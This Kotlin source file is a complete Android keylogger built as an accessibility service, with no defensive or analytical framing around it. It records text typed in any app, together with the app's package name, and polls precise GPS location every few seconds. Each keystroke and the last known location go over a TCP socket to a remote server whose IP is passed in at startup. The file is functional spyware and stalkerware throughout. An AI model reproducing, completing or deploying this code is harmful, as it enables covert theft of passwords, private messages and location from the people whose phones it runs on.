package com.example.socket

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.content.pm.PackageManager
import android.Manifest
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.OutputStreamWriter
import java.net.Socket


class keyloggerService : AccessibilityService() {
    private var serverIp: String? = null
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationRequest: LocationRequest
    private lateinit var locationCallback: LocationCallback
    private var lastLocation: String? = null // Almacenar la última ubicación conocida


    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        createLocationRequest()
        createLocationCallback()
    }

    private fun createLocationRequest() {
        locationRequest = LocationRequest.create().apply {
            interval = 10000 // Intervalo de actualización: 10 segundos
            fastestInterval = 5000 // Intervalo más rápido: 5 segundos
            priority = LocationRequest.PRIORITY_HIGH_ACCURACY
        }
    }

    private fun createLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                for (location in locationResult.locations) {
                    val latitude = location.latitude
                    val longitude = location.longitude
                    lastLocation = "La $latitude, Lo: $longitude" // Actualizar la última ubicación
                    Log.d("LocationUpdate", "Last location updated: $lastLocation")
                }
            }
        }
    }

    private fun startLocationUpdates() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null)
            } else {
                Log.e("LocationUpdate", "Permiso de ubicación no concedido")
            }
        } else {
            // Para versiones anteriores a Marshmallow, no es necesario solicitar permisos en tiempo de ejecución
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null)
        }
    }

    private fun stopLocationUpdates() {
        fusedLocationClient.removeLocationUpdates(locationCallback)
    }

    override fun onDestroy() {
        super.onDestroy()
        stopLocationUpdates()
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serverIp = intent?.getStringExtra("SERVER_IP")  // Recibir la IP del Intent
        startLocationUpdates()
        return super.onStartCommand(intent, flags, startId)
    }

    private fun sendToUI(keystrokes: String) {
        val intent = Intent("KEYLOGGER_UPDATE")
        intent.putExtra("KEYSTROKES", keystrokes)
        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Check if the event is related to text changes (e.g., typing)
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val typedText = event.text?.toString()
            val packageName = event.packageName.toString()
            // If text exists, log and send it to the server
            if (!typedText.isNullOrEmpty()) {
                val logMessage = "Package name [$packageName] Keystroke [$typedText]"
                Log.d("KeyloggerService", "Keystroke logged: $typedText")
                // Send the keystrokes to the TCP server
                sendToUI(logMessage)
                CoroutineScope(Dispatchers.IO).launch {
                    sendToServer("Location [$lastLocation], $packageName:$typedText")
                }
            }
        }
    }

    override fun onInterrupt() {
        // Handle interruption in service (if needed)
    }

    private fun sendToServer(keystrokes: String) {
//        val serverIp = "192.168.1.102"  // Replace with your server IP
        val serverPort = 12345           // Replace with your server port

        try {
            // Connect to the TCP server
            val socket = Socket(serverIp, serverPort)
            val writer = OutputStreamWriter(socket.getOutputStream())

            // Send the keystrokes
            writer.write(keystrokes)
            writer.flush()

            // Close the connection
            writer.close()
            socket.close()

            Log.d("KeyloggerService", "Keystrokes sent to server")

        } catch (e: Exception) {
            Log.e("KeyloggerService", "Error sending keystrokes: ${e.message}")

        }
    }
}